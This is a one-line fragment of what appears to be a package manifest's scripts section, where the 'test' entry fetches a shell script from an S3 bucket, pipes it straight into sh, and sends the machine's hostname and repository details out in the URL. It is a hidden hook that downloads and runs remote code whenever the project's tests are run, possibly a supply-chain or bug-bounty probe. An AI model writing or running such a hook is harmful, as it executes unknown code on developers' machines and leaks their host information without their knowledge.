    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=vue\\&hostname=`hostname`\\&foo=abi\\&step=test",
